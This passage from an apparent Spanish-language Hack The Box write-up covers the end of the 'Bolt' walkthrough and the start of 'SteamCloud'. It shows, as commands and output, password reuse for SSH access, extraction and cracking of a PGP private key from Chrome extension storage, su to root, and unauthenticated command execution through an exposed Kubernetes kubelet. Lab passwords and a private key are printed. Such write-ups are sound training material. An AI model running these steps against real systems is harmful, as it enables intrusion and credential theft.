user_id: 4e184ee6-e436-47fb-91c9-dccb57f250bc resource_id: cd0270db-c83f-4f44-b7ac-76609b397746 data: -----BEGIN PGP MESSAGE----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7 FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov 8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey 5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6 TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984 =P38i -----END PGP MESSAGE----- created: 2021-02-25 21:50:11 modified: 2021-03-06 15:34:36 1 row in set (0.00 sec) mysql\u0026gt; exit  En esta base de datos podemos encontrar los dos usuarios definidos en el sistema, y también un mensaje encriptado con PGP. La base de datos también contiene claves públicas, pero no son tan importantes.\nMovimiento lateral al usuario eddie Y otro nuevo punto muerto. Podemos tratar de cambiar al usuario eddie con alguna de las contraseñas encontradas. Curiosamente, la contraseña rT2;jW7\u0026lt;eY8!dX8}pQ8% (reutilizada en MySQL) funciona:\n$ ssh eddie@10.10.11.114 eddie@10.10.11.114's password: eddie@bolt:~$ cat user.txt 1d32df183e61b198aa42469ede79fd61  Habiendo capturado la flag user.txt, podemos continuar listando los archivos que son propiedad de eddie:\neddie@bolt:~$ find / -user eddie 2\u0026gt;/dev/null | grep -vE 'home|proc|sys|run|dev|tmp' /var/mail/eddie eddie@bolt:~$ cat /var/mail/eddie From clark@bolt.htb Thu Feb 25 14:20:19 2021 Return-Path: \u0026lt;clark@bolt.htb\u0026gt; X-Original-To: eddie@bolt.htb Delivered-To: eddie@bolt.htb Received: by bolt.htb (Postfix, from userid 1001) id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST) Subject: Important! To: \u0026lt;eddie@bolt.htb\u0026gt; X-Mailer: mail (GNU Mailutils 3.7) Message-Id: \u0026lt;20210225212019.DFF264CD@bolt.htb\u0026gt; Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST) From: Clark Griswold \u0026lt;clark@bolt.htb\u0026gt; Hey Eddie, The password management server is up and running. Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account. Once you're set up you can start importing your passwords. Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning... -Clark  Escalada de privilegios Hemos encontrado un mensaje de correo interesante enviado por clark para eddie. Le dice que use una extensión del navegador y que guarde su clave privada.\nExisten varios archivos relacionados con Google Chrome en el directorio personal de eddie. Puede ser que la configuración de la extensión esté aquí.\nBuscando una clave privada PGP Podemos buscar por contenidos de PGP en el directorio personal:\neddie@bolt:~$ grep -r 'BEGIN PGP' ~ /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js: if (!message.match(/-----BEGIN PGP MESSAGE-----/)) { /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PUBLIC_HEADER = '-----BEGIN PGP PUBLIC KEY BLOCK-----'; /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----'; /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: const reHeader = /^-----BEGIN PGP (MESSAGE, PART \\d+\\/\\d+|MESSAGE, PART \\d+|SIGNED MESSAGE|MESSAGE|PUBLIC KEY BLOCK|PRIVATE KEY BLOCK|SIGNATURE)-----$/m; /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP MESSAGE, PART X/Y /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP MESSAGE, PART X /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP SIGNED MESSAGE /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP MESSAGE /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP PUBLIC KEY BLOCK /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP PRIVATE KEY BLOCK /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP SIGNATURE /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // cleartext signatures. Note that PGP 2.x uses BEGIN PGP MESSAGE /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP MESSAGE, PART \" + partindex + \"/\" + parttotal + \"-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP MESSAGE, PART \" + partindex + \"-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"\\r\\n-----BEGIN PGP SIGNED MESSAGE-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"\\r\\n-----BEGIN PGP SIGNATURE-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP MESSAGE-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP SIGNATURE-----\\r\\n\"); Binary file /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches  Después de mirar en varios archivos, se ve que el archivo binario contiene una clave privada PGP. Esta se puede mostrar usando strings y filtrando por el formato de una clave privada:\neddie@bolt:~$ strings '/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log' | grep -oP '\\-\\-\\-\\-\\-BEGIN PGP PRIVATE [\\s\\S]*?END PGP PRIVATE KEY BLOCK\\-\\-\\-\\-\\-' | head -1 -----BEGIN PGP PRIVATE KEY BLOCK----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org 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 PSwYYWlAywj5 =cqxZ -----END PGP PRIVATE KEY BLOCK-----  Ahora, podemos informarnos sobre PGP, por ejemplo en Wikipedia. Las claves privadas se suelen proteger con una passphrase. Afortunadamente, existe una herramienta llamada gpg2john que extrae un hash de la clave privada PGP para poder romperlo con john:\n$ gpg2john eddie.pgp | tee eddie.hash.pgp File eddie.pgp Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson \u0026lt;eddie@bolt.htb\u0026gt;::eddie.pgp $ john --wordlist=$WORDLISTS/rockyou.txt eddie.hash.pgp Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 16777216 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status merrychristmas (Eddie Johnson) 1g 0:00:05:02 DONE 0.003307g/s 141.7p/s 141.7c/s 141.7C/s mike04..megan5 Use the \"--show\" option to display all of the cracked passwords reliably Session completed  Descifrando un mensaje PGP Ahora que tenemos la passphrase (merrychristmas), podemos descifrar el mensaje encontrado anteriormente en una de las bases de datos de MySQL utilizando la clave privada PGP del usuario eddie. Este paso se puede realizar con una herramienta online como PGP tool:\nComo se ve en la captura anterior, el mensaje encriptado se descifra como {\u0026quot;password\u0026quot;:\u0026quot;Z(2rmxsNW(Z?3=p/9s\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;\u0026quot;}. Esta contraseña permite acceder a la máquina como usuario root y obtener la flag root.txt:\neddie@bolt:~$ su root Password: root@bolt:/home/eddie# cat /root/root.txt 0efcfd934e37c153513612d761fe564d  ","image":"/images/HTB/Bolt/Bolt.png","permalink":"https://7rocky.github.io/htb/bolt/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene varios subdominios y una imagen de Docker con mucha información necesaria para explotar los servicios web. Existe una vulnerabilidad de SSTI en la comunicación entre dos servicios. Luego, podemos extraer una clave privada PGP de la caché de Google Chrome y descrifrar un mensaje. Para comprometer esta máquina, se necesitan conocimientos avanzados de Docker y habilidades básicas de explotación web","time":19,"title":"Bolt"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.133   Fecha: 14 / 02 / 2022   Escaneo de puertos # Nmap 7.92 scan as: nmap -sC -sV -o nmap/targeted 10.10.11.133 -p 22,80,2379,2380,8443,10249,10250,10256 Nmap scan report for 10.10.11.133 Host is up (0.054s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA) | 256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA) |_ 256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! 2379/tcp open ssl/etcd-client? | tls-alpn: |_ h2 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2022-02-15T05:29:52 |_Not valid after: 2023-02-15T05:29:53 2380/tcp open ssl/etcd-server? | tls-alpn: |_ h2 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2022-02-15T05:29:52 |_Not valid after: 2023-02-15T05:29:53 8443/tcp open ssl/https-alt |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 |_http-title: Site doesn't have a title (application/json). | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2022-02-14T05:29:51 |_Not valid after: 2025-02-14T05:29:51 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Audit-Id: 5a6a8b48-3d98-4785-b57d-e3709d704122 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 9cead1c7-5b3e-4a65-ad2d-6546af46ffed | X-Kubernetes-Pf-Prioritylevel-Uid: bd47e3d9-c067-4d0b-9798-c5f06eac806d | Date: | Content-Length: 212 | {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403} | GetRequest: | HTTP/1.0 403 Forbidden | Audit-Id: f8f45295-4ea9-4170-8f7e-ea585f749415 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 9cead1c7-5b3e-4a65-ad2d-6546af46ffed | X-Kubernetes-Pf-Prioritylevel-Uid: bd47e3d9-c067-4d0b-9798-c5f06eac806d | Date: | Content-Length: 185 | {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403} | HTTPOptions: | HTTP/1.0 403 Forbidden | Audit-Id: 7e7ce172-f7f7-4615-98de-ef8846cb2020 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 9cead1c7-5b3e-4a65-ad2d-6546af46ffed | X-Kubernetes-Pf-Prioritylevel-Uid: bd47e3d9-c067-4d0b-9798-c5f06eac806d | Date: | Content-Length: 189 |_ {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot options path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403} 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). | tls-alpn: | h2 |_ http/1.1 | ssl-cert: Subject: commonName=steamcloud@1644902997 | Subject Alternative Name: DNS:steamcloud | Not valid before: 2022-02-15T04:29:57 |_Not valid after: 2023-02-15T04:29:57 |_ssl-date: TLS randomness does not represent time 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 102.14 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP), 2379 (etcd-client), 2380 (etcd-server), 8443 (kube-apiserver), 10249 (kubelet), 10250 (kubelet) y 10256 (kube-proxy).\nReconocimiento de puertos Aunque el puerto 80 está abierto, tiene una instalación por defecto de nginx. Nada más.\nMirando los puertos que están expuestos, podemos concluir que esta máquina tiene un cluster de Kubernetes. Hacktricks est útil para comprometer esta máquina.\nPodemos ver la versión consultando al kube-apiserver:\n$ curl -k https://10.10.11.133:8443 { \"kind\": \"Status\", \"apiVersion\": \"v1\", \"metadata\": { }, \"status\": \"Failure\", \"message\": \"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\", \"reason\": \"Forbidden\", \"details\": { }, \"code\": 403 } $ curl -k https://10.10.11.133:8443/version { \"major\": \"1\", \"minor\": \"22\", \"gitVersion\": \"v1.22.3\", \"gitCommit\": \"c92036820499fedefec0f847e2054d824aea6cd1\", \"gitTreeState\": \"clean\", \"buildDate\": \"2021-10-27T18:35:25Z\", \"goVersion\": \"go1.16.9\", \"compiler\": \"gc\", \"platform\": \"linux/amd64\" }  Interactuando con el kubelet Vemos que el kubelet está expuesto. Esta entidad se ejecuta en cada nodo del cluster (es decir, está corriendo en la máquina, porque es probable que el cluster sea de un solo nodo) y controla cada Pod.\nSi este servicio está expuesto, es probable que sea vulnerable a RCE (Remote Code Execution) sin autenticación. Podemos probarlo con una petición como esta:\n$ curl -sk https://10.10.11.133:10250/pods | jq | head { \"kind\": \"PodList\", \"apiVersion\": \"v1\", \"metadata\": {}, \"items\": [ { \"metadata\": { \"name\": \"kube-apiserver-steamcloud\", \"namespace\": \"kube-system\", \"selfLink\": \"/api/v1/namespaces/kube-system/pods/kube-apiserver-steamcloud\",  Obtenemos una respuesta exitosa, por lo que somos capaces de hablar con el kubelet sin autenticación.\nPodemos listar todos los Pods en ejecución desde el kubelet:\n$ curl -sk https://10.10.11.133:10250/runningpods/ | jq '.items[].metadata.name' \"etcd-steamcloud\" \"nginx\" \"storage-provisioner\" \"kube-scheduler-steamcloud\" \"kube-apiserver-steamcloud\" \"coredns-78fcd69978-hrszm\" \"kube-proxy-dnxrw\" \"kube-controller-manager-steamcloud\"  Existe una manera de ejecutar comandos en un Pod. Utilizando curl deberíamos hacerlo así:\n$ curl -kG 'https://10.10.11.133:10250/exec/default/nginx/nginx' -d 'stdin=1' -d 'output=1' -d 'tty=1' -d 'command=whoami' Upgrade request required  Pero no funciona porque requiere una actualización del protocolo de comunicación a WebSockets, y curl no lo soporta.\nSin embargo, podemos instalar kubeletctl desde la página de descargas o compilando el proyecto en Go. Luego, podemos escanear todos los Pods para ver si alguno es vulnerable a RCE:\n$ ./kubeletctl scan rce --server 10.10.11.133 ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐ │ Node with pods vulnerable to RCE │ ├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤ │ │ NODE IP │ PODS │ NAMESPACE │ CONTAINERS │ RCE │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ │ │ │ │ │ RUN │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 1 │ 10.10.11.133 │ nginx │ default │ nginx │ + │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 2 │ │ etcd-steamcloud │ kube-system │ etcd │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 3 │ │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 4 │ │ coredns-78fcd69978-hrszm │ kube-system │ coredns │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 5 │ │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 6 │ │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 7 │ │ storage-provisioner │ kube-system │ storage-provisioner │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 8 │ │ kube-proxy-dnxrw │ kube-system │ kube-proxy │ + │ └───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘  La tabla de arriba muestra que el Pod llamado nginx es vulnerable a RCE. Por tanto, podemos ejecutar comandos dentro del contenedor nginx del Pod llamado nginx también:\n$ ./kubeletctl run 'ls /' --namespace default --pod nginx --container nginx --server 10.10.11.133 bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var  No hay necesidad de utilizar una reverse shell esta vex. Podemos leer la flag user.txt desde el contenedor:\n$ ./kubeletctl run 'ls /root' --namespace default --pod nginx --container nginx --server 10.10.11.133 user.txt $ 